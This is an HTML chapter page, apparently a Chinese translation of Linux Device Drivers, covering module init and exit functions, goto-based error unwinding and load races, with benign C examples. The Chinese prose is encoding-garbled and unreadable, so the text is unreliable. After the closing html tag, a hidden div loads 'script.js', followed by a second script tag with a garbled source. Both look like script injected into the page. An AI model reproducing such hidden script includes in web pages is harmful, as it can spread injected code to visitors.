<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>2.7.&#160;ʼ͹ͣ-Linux豸棨İ棩</title>
<meta name="description" content="" />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,,Ƶ" />
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch02.html" title="&#160;2&#160;&#160;ģ">
<link rel="prev" href="ch02s06.html" title="2.6.&#160;Ԥ֪ʶ">
<link rel="next" href="ch02s08.html" title="2.8.&#160;ģ">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">2.7.&#160;ʼ͹ͣ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch02s06.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;2&#160;&#160;ģ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch02s08.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="InitializationandShutdown.sect1"></a>2.7.&#160;ʼ͹ͣ</h2></div></div></div>
<p> ᵽ, ģʼעģṩκι. Щ, ָ¹, ӦóȡĻһһ. ʵʵĳʼ峣: </p>
<pre class="programlisting">
static int __init initialization_function(void)
{

 /* Initialization code here */
}
module_init(initialization_function);
</pre>
<p> ʼӦɾ̬, Ϊǲضļ֮ɼ; ûӲԹ涨, Ȼ, Ϊûкں, ȷ. е __init ־ܿе; һں˵İʾ, ĺֻڳʼʹ. ģģغᶪʼ, ʹڴ;. һƵıǩ (__initdata) ֻڳʼʱõ. ʹ __init  __initdata ǿѡ, 鷳ֵõ. ֻҪȷϲҪЩڳʼɺʹõĺ(ݽṹ). ܻ __devinit  __devinitdata ںԴ; Щֻںû֧ hotplug 豸ʱת __init  _initdata. ǻ 14 ̸ hotplug ֧.  </p>
<p> ʹ moudle_init ǿƵ. 궨رĶεģĿ, ҵģĳʼ. û, ĳʼᱻ.</p>
<p> ģעĲͬʩ, ͬ͵豸, ļϵͳ, ת, Լ. ÿһʩ, һضں˺ע. ںעắĲһЩݽṹָ, ʩԼҪעʩ. ݽṹģ麯ָ, ģеĺõ.  </p>
<p> ܹעĿԶԶ 1 ᵽ豸б. ǰ, , , 豸, sysfs , /proc ļ, ִ, ·. ЩעĴ󲿷ֱֲֶ֧ӺӲصĺ, Ǵ"". Щע, ΪԸַʽ( /proc ļ·)Ĺ.  
</p>
<p> ĳЩʩעΪ, ǵʹ̫ر, Բֵ. ʹöѵ, "ں˷ű"һн. ̽, ںԴ EXPORT_SYMBOL , ҵɲͬṩڵ. 󲿷עắ register_ ǰ׺, ҵǵһںԴ register_ .  </p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheCleanupFunction.sect2"></a>2.7.1.&#160;</h3></div></div></div>
<p> ÿԵģҲҪһ, עӿ, ģ鱻ȥ֮ǰԴϵͳ. Ϊ:</p>
<pre class="programlisting">
static void __exit cleanup_function(void)
{
 /* Cleanup code here */
}

module_exit(cleanup_function);
</pre>
<p> ûзֵ, Ϊ void. __exit ηʶֻģж( ͨʹ ELF ). ģֱӽں, ںóɲģж, ʶΪ __exit ĺ򵥵ض. Ϊԭ, һʶ __exit ĺֻģжػϵͳֹͣʱ; καʹǴ. һ, moudle_exit ʹںܹҵǱҪ.</p>
<p> ģûжһ, ں˲ж.  
</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ErrorHandlingDuringInitialization.sect2"></a>2.7.2.&#160;ʼеĴ</h3></div></div></div>
<p> סһ, עںʩʱ, עʧ. 򵥵ĶҪڴ, ڴܲ. ģһֱ鷵ֵ, ȷҪĲʵѾɹ.  </p>
<p> עṤʱκδ, ȵһǾģǷܹμʼԼ. , һעʧܺģԼ, ҪԹܽ. κοܵʱ, ģӦǰ, ṩʧܺ߱.</p>
<p> ֤ʵģһر͵ʧܺȫܼ, ȡκʧǰעĶ. ں˲Ѿעʩÿģע, ʼĳʧ, ģԼ˻ж. ޷עȡĶ, ں˾ͱһȶ״̬; ˲ڵĴڲָ. , , Ψһķϵͳ. ڳʼʱ, ȷʵҪСĵؽȷ. </p>
<p> ָʱ goto 䴦õ. ͨԸʹ goto, ǵĹ, һõĵط. ڴСʹ goto ȥĸ, ȶ, "ṹ" ߼. , ں, goto Ǵ󾭳õ, ʾ.  </p>
<p> Ӵ( ʹʩעע)ڳʼκεʧʱȷ: </p>
<pre class="programlisting">
int __init my_init_function(void)
{
        int err;
        /* registration takes a pointer and a name */
        err = register_this(ptr1, "skull");
        if (err)
                goto fail_this;
        err = register_that(ptr2, "skull");
        if (err)
                goto fail_that;
        err = register_those(ptr3, "skull");
        if (err)
                goto fail_those;
        return 0; /* success */
fail_those:
        unregister_that(ptr2, "skull");
fail_that:
        unregister_this(ptr1, "skull");
fail_this:
        return err; /* propagate the error */

}
</pre>
<p> δͼע 3 (鹹)ʩ. goto ʧʹ, 仵֮ǰֻ֮ǰѾɹעʩע.  </p>
<p> һѡ, Ҫ goto , ǸѾɹע, κγµģ. ֻؾЩѾɹɵĲ. Ȼѡ, Ҫ͸ CPU ʱ, ڿ;, Ȼ goto ΪõĴָ.  </p>
<p> my_init_function ķֵ, err, һ.  Linux ں, Ǹ, ڶ &lt;linux/errno.h&gt; ļ. ҪԼĴõķֵ, Ӧ &lt;linux/errno.h&gt; Աʹ÷ʽķֵ,  -ENODEV, -ENOMEM, ȵ. ʵĴһ, ΪûܹתΪִ, ʹ perror Ƶķ.</p>
<p> Ȼ, ģ볷κɳʼеע, ҹ(Ҫ)ǰעʱ෴˳עʩ.  </p>
<pre class="programlisting">
void __exit my_cleanup_function(void) 
{
 unregister_those(ptr3, "skull");
 unregister_that(ptr2, "skull");
 unregister_this(ptr1, "skull");
 return;

} 
</pre>
<p> ĳʼȴ, goto ܱڹ, Ϊеڳʼظ, ϵı. ʱ, , һֲͬĴŲ֤ɹ.  </p>
<p> ʹظСж߻, Ӧۺʱ󶼴ӳʼ. űڳעǰÿһ״̬. 򵥵ʽ, 뿴: </p>
<pre class="programlisting">
struct something *item1;
struct somethingelse *item2;
int stuff_ok;

void my_cleanup(void)
{
        if (item1)
                release_thing(item1);
        if (item2)
                release_thing2(item2);
        if (stuff_ok)
                unregister_stuff();
        return;
}

int __init my_init(void)
{
        int err = -ENOMEM;

        item1 = allocate_thing(arguments);
        item2 = allocate_thing2(arguments2);
        if (!item2 || !item2)
                goto fail;

        err = register_stuff(item1, item2);
        if (!err)
                stuff_ok = 1;
        else
                goto fail;
        return 0; /* success */

fail:
        my_cleanup();
        return err;
}
</pre>
<p> δʾ, ҲҪ, ҲҪⲿı־ʶʼĳɹ, Ҫõע/亯. ҪҪ־, ֳʼð, ֮ǰչʾļҪ. ע, , ɷ˳ʱܱ־Ϊ __exit, ͬǰ.  
</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ModuleLoadingRaces.sect2"></a>2.7.3.&#160;ģؾ</h3></div></div></div>
<p> Ŀǰ, ǵһģصҪ: . αдĳʼϲС, вϵͳȶ. ǽڱԺ۾; , Ἰ㹻: </p>
<p> ʱӦһֱס, ں˵ĳЩĲֻע֮ʹκעʩ. ȫܵ, 仰˵, ں˽ýģ, ĳʼȻʱ. Ĵ׼ñ, һĵһע. Ҫעκʩ, ֱеҪ֧ǸʩڲʼѾ.  </p>
<p> Ҳ뿼ǵĳʼʧܻᷢʲô, ں˵һѾʹģעʩ. ģǿܵ, Ӧ濼ǸҪʹʼʧ. Ͼ, ģسɹһЩõĶ. ʼʧ, Сĵشκοܵں˱𴦷Ĳ, ֱЩ.  
</p>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch02s06.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch02.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch02s08.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">2.6.&#160;Ԥ֪ʶ&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;2.8.&#160;ģ</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>